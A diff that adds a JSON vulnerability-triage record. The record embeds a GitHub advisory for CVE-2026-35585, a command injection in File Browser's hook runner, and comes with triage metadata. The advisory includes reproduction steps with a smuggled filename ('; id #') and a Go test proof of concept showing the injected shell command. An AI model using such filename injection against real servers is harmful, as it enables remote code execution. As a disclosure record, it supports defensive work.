@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/133749072?v=4\", \"events_url\": \"https://api.github.com/users/Saku0512/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Saku0512/followers\", \"following_url\": \"https://api.github.com/users/Saku0512/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Saku0512/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Saku0512\", \"id\": 133749072, \"login\": \"Saku0512\", \"node_id\": \"U_kgDOB_jZUA\", \"organizations_url\": \"https://api.github.com/users/Saku0512/orgs\", \"received_events_url\": \"https://api.github.com/users/Saku0512/received_events\", \"repos_url\": \"https://api.github.com/users/Saku0512/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Saku0512/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Saku0512/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Saku0512\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-35585\", \"cvss\": {\"score\": 7.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 7.5, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}, {\"cwe_id\": \"CWE-88\", \"name\": \"Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\"}], \"description\": \"> [!NOTE]\\n> **This feature has been disabled by default for all installations from v2.33.8 onwards, including for existent installations**. To exploit this vulnerability, the instance administrator must turn on a feature and ignore all the warnings about known vulnerabilities. We're publishing this new advisory to make it clear that all vulnerabilities concerning this feature are disclosed.\\n>\\n> For more information about tracking vulnerability issues related to the Command Execution features, check https://github.com/filebrowser/filebrowser/issues/5199.\\n\\n## Overview\\n\\nThe hook system in File Browser — which executes administrator-defined shell commands on file events such as upload, rename, and delete — is vulnerable to OS command injection. Variable substitution for values like `$FILE` and `$USERNAME` is performed via `os.Expand` without sanitization. An attacker with file write permission can craft a malicious filename containing shell metacharacters, causing the server to execute arbitrary OS commands when the hook fires. This results in **Remote Code Execution (RCE)**.\\n\\n## Affected Location\\n\\n- **File:** `runner/runner.go`\\n- **Function:** `Runner.exec`\\n\\n## Technical Details\\n\\n`Runner.exec` expands template variables inside hook command strings using `os.Expand`:\\n\\n```go\\n// runner/runner.go\\nenvMapping := func(key string) string {\\n    switch key {\\n    case \\\"FILE\\\":\\n        return path       // attacker-controlled filename\\n    case \\\"USERNAME\\\":\\n        return username   // attacker-controlled username\\n    // ...\\n    }\\n}\\n\\nfor i, arg := range command {\\n    if i == 0 { continue }\\n    command[i] = os.Expand(arg, envMapping) // expands $FILE, $USERNAME, etc.\\n}\\n```\\n\\nThe expanded value is then passed as a shell argument string. `os.Expand` performs plain string substitution with no escaping. If an admin has configured a hook such as:\\n\\n```\\nsh -c \\\"echo created $FILE\\\"\\n```\\n\\n...and an attacker creates a file named `; id #`, the variable expansion produces:\\n\\n```\\nsh -c \\\"echo created /path/to/; id #\\\"\\n```\\n\\nThe `;` terminates the `echo` command and the shell executes `id` with server privileges. The `#` character comments out the remainder, preventing syntax errors.\\n\\nThis pattern is exploitable across all hook events: `before_upload`, `after_upload`, `before_rename`, `after_rename`, `before_delete`, `after_delete`, etc.\\n\\n## Attack Scenario / Reproduction Steps\\n\\n1. Admin configures an `after_upload` hook: `sh -c \\\"echo created $FILE\\\"`.\\n2. The attacker (authenticated user with upload permission) uploads a file named `; id #`.\\n3. The upload succeeds and the hook fires automatically.\\n4. The server executes:\\n   ```sh\\n   sh -c \\\"echo created /uploads/; id #\\\"\\n   ```\\n5. The `id` command runs, confirming RCE.\\n\\n## Impact\\n\\nAny authenticated user with file create, upload, or rename permissions can achieve arbitrary RCE on the server when shell-based hooks are configured. The attacker does not need to know the exact hook command — any hook that embeds `$FILE` in a shell string is exploitable by crafting the filename accordingly.\\n\\n## Proof of Concept\\n\\n```go\\npackage runner\\n\\nimport (\\n        \\\"os\\\"\\n        \\\"testing\\\"\\n\\n        \\\"github.com/filebrowser/filebrowser/v2/settings\\\"\\n)\\n\\nfunc TestPoC_FileHookInjection(t *testing.T) {\\n        // Simulate an admin-configured shell-based hook\\n        r := &Runner{\\n                Enabled: true,\\n                Settings: &settings.Settings{\\n                        Shell: []string{\\\"sh\\\", \\\"-c\\\"},\\n                        Commands: map[string][]string{\\n                                \\\"after_upload\\\": {\\\"echo Uploaded $FILE\\\"},\\n                        },\\n                },\\n        }\\n\\n        // Malicious filename crafted by the attacker\\n        maliciousFilename := \\\"/tmp/safe; id #\\\"\\n\\n        // Simulate the exec logic in runner/runner.go\\n        raw := r.Commands[\\\"after_upload\\\"][0]\\n        command, _, _ := ParseCommand(r.Settings, raw)\\n\\n        envMapping := func(key string) string {\\n                if key == \\\"FILE\\\" {\\n                        return maliciousFilename\\n                }\\n                return os.Getenv(key)\\n        }\\n\\n        for i, arg := range command {\\n                if i == 0 {\\n                        continue\\n                }\\n                // os.Expand substitutes $FILE with the attacker-controlled filename —\\n                // no escaping is applied, so shell metacharacters pass through unchanged.\\n                command[i] = os.Expand(arg, envMapping)\\n        }\\n\\n        // The resulting command argument is the injected shell script:\\n        // sh -c \\\"echo Uploaded /tmp/safe; id #\\\"\\n        expectedArg := \\\"echo Uploaded /tmp/safe; id #\\\"\\n        if command[2] != expectedArg {\\n                t.Errorf(\\\"Expected command argument %q, got %q\\\", expectedArg, command[2])\\n        }\\n\\n        t.Logf(\\\"Confirmed: filename injection succeeded. Shell will execute: %v\\\", command)\\n}\\n```\", \"epss\": {\"percentage\": 0.01922, \"percentile\": 0.77505}, \"ghsa_id\": \"GHSA-jvpw-637p-h3pw\", \"github_reviewed_at\": \"2026-04-08T00:04:27Z\", \"html_url\": \"https://github.com/advisories/GHSA-jvpw-637p-h3pw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jvpw-637p-h3pw\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-35585\"}], \"nvd_published_at\": \"2026-04-07T17:16:33Z\", \"published_at\": \"2026-04-08T00:04:27Z\", \"references\": [\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jvpw-637p-h3pw\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-35585\", \"https://github.com/filebrowser/filebrowser/issues/5199\", \"https://github.com/advisories/GHSA-jvpw-637p-h3pw\"], \"repository_advisory_url\": \"https://api.github.com/repos/filebrowser/filebrowser/security-advisories/GHSA-jvpw-637p-h3pw\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/filebrowser/filebrowser\", \"summary\": \"File Browser has a Command Injection via Hook Runner\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T18:40:00Z\", \"url\": \"https://api.github.com/advisories/GHSA-jvpw-637p-h3pw\", \"vulnerabilities\": [{\"first_patched_version\": \"2.33.8\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/filebrowser/filebrowser/v2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.33.8\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jvpw-637p-h3pw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/filebrowser/filebrowser/v2: < 2.33.8"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-35585"
+    ],
+    "cvss_score": 7.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/filebrowser/filebrowser/v2"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.429926Z",
+  "provenance": {
+    "content_sha256": "9c811751fe46529369ad6151b2d9c23b549bd97ff0770f92f1ca9063f8166bd2",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-08T00:04:27Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jvpw-637p-h3pw",
+  "status": "active",
+  "title": "File Browser has a Command Injection via Hook Runner",
+  "updated_at": "2026-06-09T18:40:00Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jvpw-637p-h3pw"
+}
